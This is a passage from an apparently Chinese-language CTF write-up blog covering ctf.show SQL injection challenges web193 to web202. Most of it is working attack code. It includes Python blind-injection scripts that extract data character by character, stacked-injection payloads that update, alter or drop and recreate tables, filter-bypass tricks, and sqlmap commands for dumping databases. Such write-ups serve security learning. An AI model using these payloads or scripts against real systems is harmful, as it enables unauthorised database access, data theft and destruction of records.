            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>
                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>

<h4 id="web193-left-right"><a href="#web193-left-right" class="headerlink" title="web193(left right)"></a>web193(left right)</h4><p>过滤了<code>file|into|ascii|ord|hex|substr</code>，substr没了，可以用<code>left() right()</code>，其实也可以用<code>mid()</code>，这里将数据库名字给改了，和192的不一样，需要重新构造一个用来查询的语句。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url<span class="token operator">=</span><span class="token string">"http://df755a50-9318-495a-9788-1c5c721b44e2.challenge.ctf.show:8080/api/"</span>
flagstr<span class="token operator">=</span><span class="token string">"abcdefghijklmnopqrstuvwxyz1234567890_&#123;-&#125; ,"</span>

flag<span class="token operator">=</span><span class="token string">"ctf"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        change<span class="token operator">=</span>flag<span class="token operator">+</span>j
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(left((select group_concat(f1ag)from ctfshow_flxg),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>change<span class="token punctuation">&#125;</span></span><span class="token string">'),1,0)=1#"</span></span>
        <span class="token comment">#payload = f"admin' and if((select group_concat(f1ag)from ctfshow_flxg)regexp('&#123;change&#125;'),1,0)=1#"</span>
        <span class="token comment">#第二个payload没有使用截断字符串的函数，直接使用regexp进行的匹配</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre>

<p>可以将payload的left给去掉，直接正则匹配，不过需要起一个’ctfshow{‘的头就行就行。Y4大佬的做法是，将<code>&#123;</code>放到了<code>flagstr</code>的前边</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

url <span class="token operator">=</span> <span class="token string">"https://d8ecee4e-9c33-46b3-af79-befbc602b859.challenge.ctf.show/api/"</span>
flagstr <span class="token operator">=</span> <span class="token string">" _&#123;&#125;-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
flag <span class="token operator">=</span> <span class="token string">'ctf'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        tmp <span class="token operator">=</span> flag <span class="token operator">+</span> j
        <span class="token comment"># 查数据库  ctfshow_flxg,ctfshow_user</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查字段  id,f1ag</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'"</span>
        <span class="token comment"># getFlag</span>
        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_flxg"</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">'),1,2)='1"</span></span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">&#125;</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"&#125;"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>
                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre>

<p>二分法依然可行，只是并不是单独的字符比较，是字符串的比较，但原理是一样的。<br>即：ab&#x3D;ab，ab&lt;ac，是对字符串不一致的第一字符进行比较。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> time
<span class="token keyword">import</span> string
url <span class="token operator">=</span> <span class="token string">"http://fa58a58a-11d4-4c3e-9009-e7a0c53565b8.challenge.ctf.show/api/"</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span>
    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">32</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        payload <span class="token operator">=</span> <span class="token string">"admin'and ((left((select f1ag from ctfshow_flxg),&#123;&#125;)&lt;'&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment">#print(payload)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token builtin">max</span> <span class="token operator">=</span> mid
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token builtin">min</span> <span class="token operator">=</span> mid 
</code></pre>

<h4 id="web194-lpad"><a href="#web194-lpad" class="headerlink" title="web194(lpad)"></a>web194(lpad)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii|ord|hex|substr|char|left|right|substring/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>
      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span></code></pre>

<p><code>left</code> <code>right</code>被ban了，可以直接正则匹配，不过直接正则的方法有局限</p>
<p>找一找其他和截取有关的函数，发现<code>lpad()</code>。</p>
<p><code>lpad(str,len,padstr)</code><br><code>lpad()</code>函数返回字符串<code>str</code>，<code>len</code>小于字符串长度相当于字符串截取；大于字符串长度，则在左填充用字符串<code>padstr</code>直到达到<code>len</code>字符长度。</p>
<p>有左填充，一般就是右填充，找到<code>rpad()</code>，用法和<code>lpad()</code>类似。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://8be98a09-12b0-4f66-807f-899826d58216.challenge.ctf.show/api/"</span>

flagstr <span class="token operator">=</span> <span class="token string">",_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789"</span>
tempstr <span class="token operator">=</span> <span class="token string">""</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> mid <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        <span class="token comment">#payload = "admin'and ((lpad((select database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>
        <span class="token comment">#ctfshow_web</span>
        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>
        <span class="token comment">#ctfshow_flxg</span>
        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>
        <span class="token comment">#id,f1ag</span>
        payload <span class="token operator">=</span> <span class="token string">"admin'and ((lpad((select f1ag from ctfshow_flxg),&#123;&#125;,'')='&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>tempstr<span class="token operator">+</span>mid<span class="token punctuation">)</span>

        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>
            tempstr <span class="token operator">+=</span> mid
            flag <span class="token operator">+=</span> mid
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++++"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre>

<h4 id="web195-堆叠注入"><a href="#web195-堆叠注入" class="headerlink" title="web195(堆叠注入)"></a>web195(堆叠注入)</h4><p>返回逻辑</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//密码检测</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span>
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//密码判断</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

<span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"登陆成功 flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
    </code></pre>

<p>过滤了select，单双引号也被过滤，没有报错提示。</p>
<p>没有过滤分号，考虑堆叠注入。但不能有空格，可以通过反引号包裹表名等信息的方式绕过空格过滤。</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">update</span><span class="token identifier"><span class="token punctuation">`</span>ctfshow_user<span class="token punctuation">`</span></span><span class="token keyword">set</span><span class="token identifier"><span class="token punctuation">`</span>pass<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token number">1</span></code></pre>

<p>这里用update将pass改为1，可以登陆成功</p>
<p>因为查询语句的where判断是<code>username=&#123;$username&#125;</code>，并没有引号包裹，那么就可以输入数字了。</p>
<p>sql里，数字和字符串的匹配是弱类型比较，字符串会转换为数字，如<code>0==admin</code>，那么如果输入的username是0，则会匹配所有开头不</p>
<p>是数字或者为0的字符串和数字0</p>
<p>但是可以使用另一种方法</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">payload<span class="token operator">=</span><span class="token string">"0x61646d696e;update`ctfshow_user`set`pass`=0x313131;"</span>
<span class="token comment"># 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围</span>
<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = &#123;$username&#125;;"</span><span class="token punctuation">;</span></code></pre>

<h4 id="web196-select-row-0"><a href="#web196-select-row-0" class="headerlink" title="web196(select row[0])"></a>web196(select row[0])</h4><p>这道题目的select虽然写的是被过滤了，但是实际并没有被过滤。（根据群里的反馈，说群主本来是打算把过滤select写成se1ect，但是</p>
<p>忘记改了。不过se1ect也并没有被过滤，感觉纯粹就是没有加select的过滤～）</p>
<p>可以用select绕过password的if判断。</p>
<p>判断条件满足的设定是<code>$row[0]==$password</code>，$row存储的是结果集中的一行数据，$row[0]就是这一行的第一个数据。既然可以堆叠注</p>
<p>入，就是可以多语句查询，$row应该也会逐一循环获取每个结果集。</p>
<p>那么可以输入username为<code>1;select(9)</code>，password为9。当$row获取到第二个查询语句select(9)的结果集时，即可获得$row[0]&#x3D;9，那</p>
<p>么password输入9就可以满足条件判断。同样输入其他密码也可以</p>
<h4 id="web197-alert修改字段-show-tables-drop"><a href="#web197-alert修改字段-show-tables-drop" class="headerlink" title="web197(alert修改字段  show tables  drop)"></a>web197(alert修改字段  show tables  drop)</h4><p>返回逻辑</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"登陆成功 flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
    </code></pre>

<p>这次select被ban了</p>
<p><strong>方法一</strong></p>
<p>利用<code>show</code>。根据题目给的查询语句，可以知道数据库的表名为ctfshow_user，那么可以通过<code>show tables</code>，获取表名的结果集，在这个</p>
<p>结果集里定然有一行的数据为ctfshow_user。</p>
<p>用户名：<code>1;show tables</code></p>
<p>密码：<code>ctfshow_user</code></p>
<p><strong>方法二</strong></p>
<p>可以利用<code>alter</code>修改字段名，把<code>id</code>和<code>pass</code>对调，然后爆破id。</p>
<p><strong>ALTER TABLE</strong> 语句用于在已有的表中添加、修改或删除列。</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;alter table ctfshow_user change column &#96;pass&#96; &#96;a&#96; varchar(255);alter table ctfshow_user change column &#96;id&#96; &#96;pass&#96; varchar(255);alter table ctfshow_user change column &#96;a&#96; &#96;id&#96; varchar(255)</code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"https://1a4c8604-7c24-4000-a07a-b9c23f8c0ca3.challenge.ctf.show/api/"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '</span>
                        <span class="token string">'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '</span>
                        <span class="token string">'varchar(255);'</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
        <span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0x61646d696e'</span><span class="token punctuation">,</span>  <span class="token comment"># 0</span>
        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
    <span class="token punctuation">&#125;</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"登陆成功"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+]id </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string"> is right"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
</code></pre>

<p><strong>方法三</strong></p>
<p>更新表。过滤了update，但我们可以删表，重新建一个同样表名的表，列名给的查询语句也已经告知，分别是username和pass。</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;drop table ctfshow_user;create table ctfshow_user(&#96;username&#96; varchar(100),&#96;pass&#96; varchar(100));insert ctfshow_user(&#96;username&#96;,&#96;pass&#96;) value(1,1)</code></pre>


<p>这里的意思就是删除以前的表，再自己新建一个并且插入数据：username&#x3D;1，pass&#x3D;1</p>
<p>然后直接输入1为用户名和密码，登录即可得到flag。</p>
<h4 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h4><p>过滤了<code>create</code> <code>drop</code>，但可以用其他方法</p>
<h4 id="wen199"><a href="#wen199" class="headerlink" title="wen199"></a>wen199</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span></code></pre>

<p><strong>方法一</strong>：本题依然可以使用<code>show tables</code>。</p>
<p><strong>方法二</strong>：本题过滤了括号，限制了之前payload中的varchar(100)，可以改为text。</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;alter table ctfshow_user change &#96;pass&#96; &#96;tmp&#96; text;alter table ctfshow_user change &#96;username&#96; &#96;pass&#96; text;alter table ctfshow_user change &#96;tmp&#96; &#96;username&#96; text;</code></pre>

<h4 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h4><p>增加了逗号的过滤，不影响。web199的两个方法都可以用。</p>
<h4 id="web201-Sqlmap-–referer"><a href="#web201-Sqlmap-–referer" class="headerlink" title="web201(Sqlmap –referer)"></a>web201(Sqlmap –referer)</h4><p><a target="_blank" rel="noopener" href="https://sqlmap.highlight.ink/"><a target="_blank" rel="noopener" href="https://sqlmap.highlight.ink/">sqlmap 用户手册</a></a></p>
<p>SQLmap使用顺序：</p>
<ol>
<li>获取当前MySQL中的所有数据库<code>sqlmap -u http://xxx</code></li>
<li>获取当前数据库名字</li>
<li>获取数据库下的数据表</li>
<li>获取表下的列名</li>
<li>导出数据</li>
</ol>
<p><img src="web201.png" loading="lazy"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43621629/article/details/104515866">Sqlmap 性能优化</a></p>
<p>设置多线程</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://127.0.0.1/sqli/Less-1/?id=1"</span> <span class="token parameter variable">--threads</span><span class="token operator">=</span><span class="token number">5</span> <span class="token parameter variable">--banner</span> <span class="token parameter variable">-v</span> <span class="token number">5</span></code></pre>

<p>要添加一个referer头</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">查数据库：python sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -dbs</code></pre>

<p><img src="web201_2.png" loading="lazy"></p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">查表名：python sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web --tables</code></pre>

<p><img src="web201_3.png" loading="lazy"></p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">查列名：python sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user --columns</code></pre>

<p><img src="web201_4.png" loading="lazy"></p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">查Flag：python sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre>

<p><img src="web201_5.png" loading="lazy"></p>
<h4 id="web202-–data"><a href="#web202-–data" class="headerlink" title="web202(–data)"></a>web202(–data)</h4><p>–data&#x3D;DATA         该参数指定的数据会被作为POST数据提交</p>
